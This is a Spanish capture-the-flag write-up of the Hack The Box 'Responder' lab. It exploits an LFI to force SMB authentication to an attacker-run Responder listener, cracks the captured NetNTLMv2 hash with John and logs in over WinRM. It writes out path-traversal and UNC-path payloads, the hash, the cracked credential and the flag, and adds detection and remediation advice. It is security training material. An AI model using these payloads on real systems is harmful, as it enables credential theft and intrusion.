---
tags:
  - htb
  - starting-point
  - tier-1
  - easy
  - windows
  - forced-authentication
  - ntlmv2
  - terminada
ip: 10.129.93.154
os: Windows
difficulty: Easy
status: terminada
tiempo: 1h 0m
fecha_inicio: 2026-08-13
fecha_completada: 2026-08-22
puntos: 20
mitre_tactics:
  - Initial Access
  - Credential Access
mitre_techniques:
  - T1190
  - T1187
  - T1110.002
---
# 🖥️ Responder — Windows — Easy (Tier 1)

> [!info] Resumen
> **IP:** `10.129.93.154` | **OS:** Windows | **Tier/Fase:** 1 | **Tiempo:** 1h 0m
> LFI en `index.php?page=` (virtual host `unika.htb`) usada para forzar una autenticación SMB saliente hacia un host controlado por el atacante — Responder captura el hash NetNTLMv2 del usuario `Administrator`, se crackea offline con John the Ripper (`badminton`).

---

## 1. Reconocimiento

```bash
nmap -sCV -p- --min-rate 5000 10.129.93.154 -oN nmap.txt
```

| Puerto   | Servicio  | Versión                     | Hallazgo clave                                           |
| -------- | --------- | --------------------------- | -------------------------------------------------------- |
| 80/TCP   | http      | Apache httpd 2.4.52         | Redirige por Host header → virtual host `unika.htb`     |
| 5985/TCP | http      | Microsoft HTTPAPI httpd 2.0 | WinRM — objetivo post-credenciales                       |
| 7680/tcp | pando-pub | -                           | Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows |

> [!note] IP reasignada
> El escaneo inicial (13-ago) fue contra `10.129.73.245`; al retomar y resolver (22-ago) HTB había reasignado la instancia a `10.129.93.154` — normal tras una desconexión larga de la VPN/instancia. Revisar siempre la IP activa antes de reusar comandos de una sesión anterior.

**→ Vector:** LFI en la aplicación web (puerto 80, tras descubrir el virtual host `unika.htb`), escalado a captura de hash NTLMv2 forzando autenticación SMB — no es un servicio vulnerable "de fábrica" ni poisoning pasivo de broadcast.

---

## 2. Explotación

> Vector: LFI (`index.php?page=`) → Forced Authentication SMB vía UNC path → captura NetNTLMv2 con Responder → cracking offline (John) → WinRM

```bash
# Paso 1: unika.htb no resuelve por DNS público — forzar virtual host localmente
echo "10.129.93.154 unika.htb" | sudo tee -a /etc/hosts

# Paso 2: confirmar LFI en el parámetro page vía path traversal
http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
# Éxito: se filtra el hosts real de la víctima → include() sin sanitizar

# Paso 3: levantar Responder en la interfaz de la VPN de HTB (ANTES de disparar el trigger)
sudo responder -I tun0

# Paso 4: forzar la autenticación SMB — usar la IP de tun0 (la propia), NO la IP de la víctima
http://unika.htb/?page=//<IP_TUN0_ATACANTE>/whatever
# El include() falla del lado del servidor (error PHP visible), pero el intento SMB
# ya salió antes del fallo — Responder lo captura igual.

# Paso 5: hash capturado (guardar tal cual lo reporta Responder)
echo "Administrator::RESPONDER:c4943cd1c7169e71:F92B50A59CF6E832C53D08E0B65C37B6:0101..." > hash.txt

# Paso 6: crackear con John
john -w=/usr/share/wordlists/rockyou.txt hash.txt
# → badminton (Administrator)

# Paso 7: WinRM con la credencial obtenida
evil-winrm -i 10.129.93.154 -u Administrator -p badminton

# Paso 8: la flag NO está en el home del usuario autenticado — revisar Desktop de
# otros usuarios del sistema. Se encuentra en C:\Users\mike\Desktop\flag.txt
```

> [!success] Credencial y Flag obtenidas
> **Credencial:** `Administrator` / `badminton` (vía NetNTLMv2 forzado + cracking)
> **Flag:** `ea81b7afddd03efaa0945333ed147fac` — en `C:\Users\mike\Desktop\flag.txt` (usuario mike, no Administrator)

---

## 3. Escalación de Privilegios

N/A — el objetivo de Tier 1 es obtener la contraseña en texto plano vía cracking y usarla para autenticarse, no post-explotación adicional. La cuenta obtenida (Administrator) ya tiene privilegio administrativo completo.

---

## 4. MITRE ATT&CK

| Táctica         | Técnica                          | ID        | Uso en esta máquina                                                                 |
| ---------------- | ---------------------------------- | --------- | -------------------------------------------------------------------------------------- |
| Initial Access   | Exploit Public-Facing Application | T1190     | LFI sin sanitizar en `index.php?page=` de la app web                                  |
| Credential Access | Forced Authentication             | T1187     | El LFI se usa para forzar un `include()` sobre un UNC path SMB, obligando al host Windows a autenticarse contra el servidor de Responder |
| Credential Access | Brute Force: Password Cracking    | T1110.002 | John the Ripper offline contra el hash NetNTLMv2 capturado                             |

> [!warning] Corrección de mapeo
> La versión anterior de este writeup marcaba T1557.001 (LLMNR/NBT-NS Poisoning). Es incorrecto para esta máquina: T1557.001 aplica cuando el atacante responde pasivamente a broadcasts de resolución de nombres fallida. Aquí el atacante **forzó activamente** la autenticación especificando un UNC path exacto (`//IP_atacante/whatever`) vía el parámetro `page=` — eso es T1187 (Forced Authentication). Responder fue la herramienta de captura en ambos casos, pero el mecanismo de disparo es distinto y cambia la detección/remediación aplicable (ver sección 5).

---

## 5. Detección & Remediación

**Blue Team detecta:**
- Tráfico SMB (445) saliente desde un host de la red interna hacia una IP externa/no inventariada — un cliente Windows normal no inicia SMB hacia IPs arbitrarias de internet
- Autenticaciones NTLM registradas con un nombre de servidor/dominio anómalo (`RESPONDER` en este caso, en vez del hostname real del DC)
- En el servidor web: solicitudes a `index.php?page=` con payloads de path traversal (`../../`) o rutas UNC (`//`) en los logs de Apache

**Remediación:**
- Causa raíz: sanitizar/whitelistear el parámetro `page` (permitir solo valores de una lista fija: `english`, `french`, `german`) — sin esto, cualquier otra mitigación es un parche sobre el síntoma
- Bloquear SMB saliente (445) hacia IPs fuera de la red interna en el firewall perimetral/del host — así, aunque el LFI siga vivo, no puede alcanzar un servidor SMB del atacante
- Forzar SMB Signing para mitigar relay si un hash se llega a capturar de todos modos
- Políticas de contraseña fuertes: `badminton` es una palabra de diccionario trivial — con una política real esto no se crackea en segundos

> [!note] Ojo con la remediación genérica
> Deshabilitar LLMNR/NBT-NS (la mitigación típica de "Responder poisoning") **no habría prevenido este ataque** — el atacante nunca dependió de un broadcast fallido, especificó la IP UNC directamente. Aplicar la mitigación equivocada da falsa sensación de seguridad.

---

## 6. Lecciones

- Un LFI (`include()` sin sanitizar) no solo sirve para leer archivos locales — apuntado a una ruta UNC (`//IP/recurso`) fuerza autenticación SMB saliente, aunque el `include()` en sí falle del lado del servidor.
- La IP en el payload `page=//IP/whatever` es la del atacante (la interfaz `tun0`, no la IP de la víctima) — confundir esto deja a Responder escuchando indefinidamente sin capturar nada (bloqueo real documentado abajo).
- Flag y credencial de acceso son datos distintos: la flag es un valor a reportar, no una contraseña de usuario — no mezclarlos en el reporte final (error propio en el primer borrador de este writeup).

**Bloqueado:**

| Fase | Causa                                                                          | Fix                                                    |
| ---- | -------------------------------------------------------------------------------- | ----------------------------------------------------- |
| 2    | Responder no capturaba nada — el payload `page=` apuntaba a la IP de la víctima, no a la IP de `tun0` del atacante | Usar `?page=//IP_TUNEL_ATACANTE/whatever`             |

---

## 7. Conexiones

- Similar: `[[HTB/Sequel/Sequel]]` (credencial obtenida por medio indirecto, no exploit clásico)
- Similar: `[[HTB/Appointment/Appointment]]` (explotación web — LFI vs SQLi, misma familia de vulnerabilidad de aplicación pública)
- Siguiente nivel: máquinas de Fase 2 (Active Directory) — este es el primer contacto con captura de hash NTLM
- Técnica: `[[Técnicas/5_Active-Directory/Forced-Authentication-SMB]]`
- Teoría: [`Teoria_LLMNR_Responder`](obsidian://open?vault=RedTeamLab&file=HTB%2FResponder%2FTeoria_LLMNR_Responder.pdf) · [`WriteUp_Oficial_Responder_ES`](obsidian://open?vault=RedTeamLab&file=HTB%2FResponder%2FWriteUp_Oficial_Responder_ES.pdf)

**Referencias:** [HackTricks - LLMNR/NBT-NS Poisoning](https://book.hacktricks.xyz/windows-hardening/ad-information-in-windows/broadcast-llmnr-nbt-ns-mdns-spoofing) · [MITRE T1187 - Forced Authentication](https://attack.mitre.org/techniques/T1187/) · [MITRE T1190 - Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)
